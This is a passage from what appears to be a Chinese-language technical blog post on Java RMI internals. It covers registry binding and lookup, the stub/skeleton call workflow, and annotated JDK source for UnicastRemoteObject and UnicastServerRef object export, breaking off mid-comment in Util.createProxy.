<p><code>java.rmi.Naming</code> 类提供了与 RMI 注册中心的交互功能。这个类提供了几个静态方法，用来在 RMI 注册中心中 <strong>查找</strong>、<strong>绑定</strong>、<strong>更新</strong> 或 <strong>解绑</strong> 远程对象：</p>
<ul>
<li><strong>查找远程对象</strong>： <code>lookup</code></li>
<li><strong>绑定远程对象</strong>： <code>bind</code>（对象已经存在会抛出异常）和 <code>rebind</code>（会覆盖已有对象）</li>
<li><strong>解除绑定远程对象</strong>： <code>unbind</code></li>
<li><strong>列出远程对象</strong>： <code>list</code></li>
</ul>
<p>在服务端代码中，远程对象注册通常是通过 <code>Naming.rebind()</code> 或 <code>Naming.bind()</code> 来实现的。这些方法将远程对象与一个名字绑定，从而让客户端可以使用该名字进行查找。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 创建并启动 RMI 注册中心，监听 1099 端口</span></span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 创建远程对象实例</span></span><br><span class="line">        <span class="type">RemoteHello</span> <span class="variable">hello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteHello</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 将远程对象注册到 RMI 注册中心，绑定名字 &quot;hello&quot;</span></span><br><span class="line">        Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/hello&quot;</span>, hello);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;RemoteHello object is registered.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在上面的示例中，<code>Naming.bind(&quot;rmi://127.0.0.1:1099/hello&quot;, hello)</code> 将 <code>hello</code> 远程对象注册到 RMI 注册中心中，绑定的名字为 <code>&quot;hello&quot;</code>。客户端将通过这个名字来查找并调用远程对象的方法。</p>
<p>除此之外，RMI 还提供了另一种绑定方式。因为通常我们会把注册中心和服务端放在一起，因此 <code>LocateRegistry.createRegistry</code> 创建的注册中心对象 <code>Registry</code>（实际是 <code>sun.rmi.registry.RegistryImpl</code> 实现的 <code>Registry</code> 接口）同样有一个 <code>bind</code> 方法用于注册远程对象。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"><span class="type">RemoteHello</span> <span class="variable">hello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteHello</span>();</span><br><span class="line">registry.bind(<span class="string">&quot;hello&quot;</span>, hello);</span><br></pre></td></tr></table></figure></div>

<p>由于这个方法直接指定了注册中心，因此 <code>bind</code> 的第一个参数是要与远程对象绑定的名称而不是完整的RMI URL（如 <code>rmi://host:port/name</code>）。</p>
<h4 id="客户端查找远程对象"><a href="#客户端查找远程对象" class="headerlink" title="客户端查找远程对象"></a>客户端查找远程对象</h4><p>客户端通过 RMI 注册中心查找远程对象，方法是使用 <code>Naming.lookup()</code>。这时，客户端将通过给定的名字从 RMI 注册中心中查找远程对象，并通过返回的存根（stub）对象调用远程方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="type">Hello</span> <span class="variable">hello</span> <span class="operator">=</span> (Hello) registry.lookup(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        System.out.println(hello.sayHello(<span class="string">&quot;sky123&quot;</span>));</span><br><span class="line">        System.out.println(hello.sayGoodBye());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="RMI-工作流程"><a href="#RMI-工作流程" class="headerlink" title="RMI 工作流程"></a>RMI 工作流程</h2><p>RMI 的工作流程大致如下图所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/08/25/Java%20RMI%20&%20JNDI/images/RMI.png"
                      alt="img"
                ></p>
<p>RMI 底层通讯采用了 Stub (运行在客户端) 和 Skeleton (运行在服务端) 机制，RMI 调用远程方法的大致如下：</p>
<ol>
<li><strong>服务端创建远程对象（Object）</strong> ，并准备好提供远程服务。<ul>
<li>如果是普通的对象（继承于 <code>UnicastRemoteObject</code>）：<ul>
<li>创建动态代理类，处理器为 <code>RemoteObjectInvocationHandler</code>。</li>
<li>因为要通过方法哈希查找对应方法，因此会将方法哈希到方法的映射存放在哈希表 <code>hashToMethod_Map</code> 中。</li>
</ul>
</li>
<li>如果是注册中心（<code>RegistryImpl</code>），则创建 <code>RegistryImpl_Stub</code> 和 <code>RegistryImpl_Skel</code>。</li>
<li>如果是 DGC（<code>DGCImpl</code>），则创建 <code>DGCImpl_Stub</code> 和 <code>DGCImpl_Skel</code>。</li>
<li>远程对象最后会封装成 <code>Target</code> 对象用注册到 <code>ObjectTable</code> 中，其中包括：<ul>
<li><code>Remote impl</code>：远程对象本体。</li>
<li><code>Dispatcher disp</code>：分发器，是导出对象的 <code>UnicastServerRef</code> 用于处理远程调用请求。对于注册中心和 DGC，<code>UnicastServerRef</code> 会包含 Skel。</li>
<li><code>Remote stub</code>：创建的远程对象存根。<ul>
<li>对于普通远程对象则是远程对象的动态代理。</li>
<li>对于注册中心和 DGC 则是对应的 Skel 对象。</li>
</ul>
</li>
<li><code>ObjID id</code>：对象 Id。<ul>
<li>对于普通远程对象由于没有指定对象 Id，因此在初始化时设为随机值。</li>
<li>对于注册中心则是 0。</li>
<li>对于 DGC 则是 2。</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><strong>服务端将远程对象注册到 RMI Registry 中</strong> ，使客户端可以通过名称查找到远程对象。<ul>
<li>服务端通过调用 <code>RegistryImpl_Stub#bind</code> 方法远程调用注册中心的 <code>bind</code> 方法，将需要注册的类的名称（如果是 RMI URL 则先获到对应的注册中心然后再传递注册的类的名称）和注册的类的动态代理类（Stub）序列化后传递给注册中心。这本质上是对注册中心的 <code>RegistryImpl</code> 的一次 RMI 远程调用。为了避免先有鸡先有蛋的问题，<code>RegistryImpl_Stub</code> 是在调用 <code>LocateRegistry#getRegistry</code> 的时候本地创建的。</li>
<li>注册中心的 <code>TCPTransport#handleMessages</code> 在接收到远程调用后根据对象 Id 在 <code>ObjectTable</code> 找到对应的 <code>Target</code> 对象然后调用其 <code>Target.disp.dispatch</code> 方法进行分发。</li>
<li>对于非普通远程对象会被分发到 <code>oldDispatch</code> 方法，随即会调用 <code>RegistryImpl_Skel#dispatch</code> 根据 <code>opnum</code> 执行对应的处理逻辑，这里应该执行 <code>bind</code> 分支。</li>
<li>在 <code>bind</code> 分支中 <code>RegistryImpl_Skel</code> 会将远程对象名称到远程对象的映射存放到哈希表 <code>bindings</code> 中。</li>
</ul>
</li>
<li><strong>客户端通过 RMI Registry 查找注册的远程对象</strong> 。<ul>
<li>客户端通过 <code>RegistryImpl_Skel#find</code> 方法对注册中心进行 RMI 远程调用，参数为要获取的远程对象名称。</li>
</ul>
</li>
<li><strong>RMI Registry 返回远程对象的 Stub 给客户端</strong> ，客户端通过该 Stub 间接与服务端交互。<ul>
<li>注册中心经历同样的过程，最终调用到 <code>RegistryImpl_Skel#dispatch</code> 的 <code>find</code> 分支。</li>
<li>在 <code>find</code> 分支中 <code>RegistryImpl_Skel</code> 会根据远程对象的名称在哈希表 <code>bindings</code> 中查询到对应的存根类序列化返回。</li>
<li>客户端反序列化结果得到远程对象的存根类。</li>
</ul>
</li>
<li><strong>客户端调用 Stub 上的远程方法</strong> ，Stub 会将调用请求封装并发送至服务端。<ul>
<li>因为这里调用的是普通远程对象的方法，而普通的远程对象的 Stub 是动态代理，因此会被转发到动态代理的 <code>invoke</code> 方法。</li>
</ul>
</li>
<li><strong>Stub 和 Skeleton 之间建立通信通道并发送远程调用请求</strong> 。<ul>
<li>首先建立连接，并且发送调用信息，主要是远程对象 Id，要调用的方法的哈希（因此是普通对象，不采用方法 Id），</li>
<li>如果远程调用有参数则同样需要参数序列化后发送给 Skeleton。</li>
</ul>
</li>
<li><strong>Skeleton 接收到 Stub 发来的请求后，代理调用真正的远程对象方法</strong> 。<ul>
<li>这里同样是 <code>TCPTransport#handleMessages</code> 在接收到远程调用后根据对象 Id 在 <code>ObjectTable</code> 找到对应的 <code>Target</code> 对象然后调用其 <code>Target.disp.dispatch</code> 方法进行分发。</li>
<li>由于是调用普通对象的方法，因此会直接根据方法哈希在哈希表 <code>bindings</code> 中找到要调用的远程对象的方法，而不是不是调用 <code>oldDispatch</code> 方法来执行对应的处理分支。</li>
<li>如果有参数则对参数进行反序列化。</li>
<li>反射调用远程对象的方法。</li>
</ul>
</li>
<li><strong>方法执行完毕后，Skeleton 将执行结果返回</strong> 。</li>
<li><strong>Skeleton 将结果通过通信通道发送回 Stub</strong> 。<ul>
<li>远程对象的方法如果有返回值，则将返回结果序列化后发回 Stub。</li>
<li>如果出现异常将异常结果序列化后发回 Stub。</li>
</ul>
</li>
<li><strong>Stub 接收到结果后，返回给客户端用户程序</strong> ，远程调用结束。<ul>
<li>Stub 将远程返回的结果反序列化后返回给用户程序。</li>
<li>如果返回的远程调用状态为异常则将异常结果反序列化后抛出。</li>
</ul>
</li>
</ol>
<p>以上过程的细节如下图所示，具体代码分析见下文。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/08/25/Java%20RMI%20&%20JNDI/images/1633322482542.png"
                      alt="img"
                ></p>
<h3 id="服务注册"><a href="#服务注册" class="headerlink" title="服务注册"></a>服务注册</h3><h4 id="远程对象创建"><a href="#远程对象创建" class="headerlink" title="远程对象创建"></a>远程对象创建</h4><p>通常我们定义的远程对象会继承于 <code>java.rmi.server.UnicastRemoteObject</code>：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteHello</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">Hello</span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RemoteHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此创建远程对象的时候会调用父类 <code>UnicastRemoteObject</code> 的构造函数。关于 <code>UnicastRemoteObject</code> 的构造函数的调用有如下调用链：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用指定的服务器引用导出指定的远程对象。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote obj, UnicastServerRef sref)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="comment">// 如果远程对象是 UnicastRemoteObject 的实例，则设置其引用</span></span><br><span class="line">    <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> UnicastRemoteObject) &#123;</span><br><span class="line">        ((UnicastRemoteObject) obj).ref = sref;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用 UnicastServerRef 的 exportObject 方法，完成远程对象的导出</span></span><br><span class="line">    <span class="keyword">return</span> sref.exportObject(obj, <span class="literal">null</span>, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 导出远程对象，使其能够接收来自客户端的调用，并使用指定的端口。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;该对象通过使用 &#123;<span class="doctag">@link</span> RMISocketFactory&#125; 类创建的服务器套接字进行导出。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> obj 需要导出的远程对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> port 用于导出远程对象的端口号</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 远程对象的存根（Stub）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@exception</span> RemoteException 如果导出失败，则抛出该异常</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote obj, <span class="type">int</span> port)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="comment">// 调用带 UnicastServerRef 参数的 exportObject 方法进行远程对象导出</span></span><br><span class="line">    <span class="keyword">return</span> exportObject(obj, <span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(port));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用指定的端口号创建并导出一个新的 UnicastRemoteObject 对象。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;该对象通过使用 &#123;<span class="doctag">@link</span> RMISocketFactory&#125; 类创建的服务器套接字进行导出。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> port 远程对象接收调用的端口号</span></span><br><span class="line"><span class="comment"> *              （如果 &lt;code&gt;port&lt;/code&gt; 为零，则选择一个匿名端口）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> RemoteException 如果导出对象失败，抛出该异常</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">UnicastRemoteObject</span><span class="params">(<span class="type">int</span> port)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="built_in">this</span>.port = port;  <span class="comment">// 设置端口号</span></span><br><span class="line">    exportObject((Remote) <span class="built_in">this</span>, port);  <span class="comment">// 调用导出方法，将远程对象导出到指定端口</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用匿名端口创建并导出一个新的 UnicastRemoteObject 对象。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;该对象通过使用 &#123;<span class="doctag">@link</span> RMISocketFactory&#125; 类创建的服务器套接字进行导出。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> RemoteException 如果导出对象失败，抛出该异常</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> JDK1.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">UnicastRemoteObject</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="built_in">this</span>(<span class="number">0</span>);  <span class="comment">// 调用带端口号的构造方法，0 表示使用匿名端口</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>UnicastRemoteObject</code> 构造函数的调用过程为：</p>
<ol>
<li><strong><code>UnicastRemoteObject()</code></strong> ：使用匿名端口（端口为 0，系统会自动选择一个可用端口）创建并导出一个 <code>UnicastRemoteObject</code> 对象。</li>
<li><strong><code>UnicastRemoteObject(int port)</code></strong> ：使用 <code>UnicastRemoteObject</code> 对象本身和指定的端口号创建并导出一个 <code>UnicastRemoteObject</code> 对象。</li>
<li><strong><code>exportObject(Remote obj, int port)</code></strong> ：根据传入的端口号创建一个 <code>UnicastServerRef</code> 对象（存在多层封装，与网络连接有关）用于将远程对象导出到指定的服务器引用。</li>
<li><strong><code>exportObject(Remote obj, UnicastServerRef sref)</code></strong> ：检查传入的 <code>obj</code> 是否是 <code>UnicastRemoteObject</code> 的实例。如果是，设置<code>UnicastRemoteObject</code> 对象的 <code>ref</code> 属性为指定的 <code>UnicastServerRef</code>。<code>UnicastServerRef</code> 是远程对象导出时所需的服务器引用，负责处理网络请求和数据传输。</li>
</ol>
<p><code>UnicastRemoteObject</code> 构造函数最终会调用到 <code>UnicastServerRef</code> 的 <code>exportObject(Remote impl, Object data, boolean permanent)</code> 方法创建服务器存根（<code>Stub</code>），该函数逻辑如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 导出该对象，为该调度器创建骨架和存根。</span></span><br><span class="line"><span class="comment"> * 根据实现类的类型创建存根，并用适当的远程引用初始化它。</span></span><br><span class="line"><span class="comment"> * 创建由实现类、调度器（当前对象）和存根定义的目标对象。</span></span><br><span class="line"><span class="comment"> * 通过 Ref 导出该目标对象。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote impl, Object data,</span></span><br><span class="line"><span class="params">                            <span class="type">boolean</span> permanent)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    Class&lt;?&gt; implClass = impl.getClass();  <span class="comment">// 获取远程对象实现类</span></span><br><span class="line">    Remote stub;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 创建存根（Stub），使用远程对象的实现类和客户端引用</span></span><br><span class="line">        stub = Util.createProxy(implClass, getClientRef(), forceStubUse);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="comment">// 如果实现类没有合法的远程接口，抛出异常</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExportException</span>(</span><br><span class="line">            <span class="string">&quot;remote object implements illegal remote interface&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果存根是 RemoteStub 的实例，设置骨架（Skeleton）</span></span><br><span class="line">    <span class="keyword">if</span> (stub <span class="keyword">instanceof</span> RemoteStub) &#123;</span><br><span class="line">        setSkeleton(impl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建目标对象，目标包含实现类、当前对象（调度器）、存根和引用等信息</span></span><br><span class="line">    <span class="type">Target</span> <span class="variable">target</span> <span class="operator">=</span> </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Target</span>(impl, <span class="built_in">this</span>, stub, ref.getObjID(), permanent);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过引用（ref）导出目标对象</span></span><br><span class="line">    ref.exportObject(target);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取实现类对应的方法映射</span></span><br><span class="line">    hashToMethod_Map = hashToMethod_Maps.get(implClass);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回存根</span></span><br><span class="line">    <span class="keyword">return</span> stub;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>服务器存根是通过 <code>sun.rmi.server.Util#createProxy()</code> 创建的代理类，创建时需要以下几个参数：</p>
<ul>
<li><p><code>implClass</code>：远程对象的实现类，这里也就是 <code>RemoteHello.class</code>。</p>
</li>
<li><p><code>getClientRef()</code>：实际上就是将 <code>UnicastServerRef</code> 的 <code>LiveRef</code> 属性封装成一个<code>UnicastRef</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 注意：此类的 getLiveRef 方法（由于它被 UnicastRef2 继承）</span></span><br><span class="line"><span class="comment"> * 对于 javax.management.remote.rmi.RMIConnector 的实现有一个 JDK 内部的依赖。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnicastRef</span> <span class="keyword">implements</span> <span class="title class_">RemoteRef</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> LiveRef ref;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建一个新的 Unicast RemoteRef。</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> liveRef 远程对象的 LiveRef 引用</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UnicastRef</span><span class="params">(LiveRef liveRef)</span> &#123;</span><br><span class="line">        ref = liveRef;  <span class="comment">// 设置 LiveRef，表示远程对象的具体信息</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnicastServerRef</span> <span class="keyword">extends</span> <span class="title class_">UnicastRef</span></span><br><span class="line">    <span class="keyword">implements</span> <span class="title class_">ServerRef</span>, Dispatcher &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 返回此远程引用的客户端引用。</span></span><br><span class="line"><span class="comment">     * 对于客户端的 RemoteRef，返回 &quot;this&quot; 本身。</span></span><br><span class="line"><span class="comment">     * 对于服务端的远程引用，将需要找到或创建一个客户端的引用。</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 客户端可用的远程引用实例</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> RemoteRef <span class="title function_">getClientRef</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(ref);  <span class="comment">// 基于服务端引用 ref 创建客户端引用</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><code>forceStubUse</code>：<code>UnicastServerRef</code> 未显式初始化该成员，因此默认为 <code>false</code>。</p>
</li>
</ul>
<p>在 <code>sun.rmi.server.Util#createProxy()</code> 函数中，由于 <code>stubClassExists</code> 返回 <code>false</code>，因此不走 <code>createStub</code> 逻辑而是为远程对象 <code>RemoteHello</code> 创建动态代理。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 为指定的实现类（implClass）返回一个代理对象。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 如果满足以下两个条件，则返回实现类的动态代理（否则返回指定实现类的 RemoteStub 实例）：</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *    a) 要么属性 java.rmi.server.ignoreStubClasses 为 true，要么指定实现类没有预生成的存根类，</span></span><br><span class="line"><span class="comment"> *       并且</span></span><br><span class="line"><span class="comment"> *    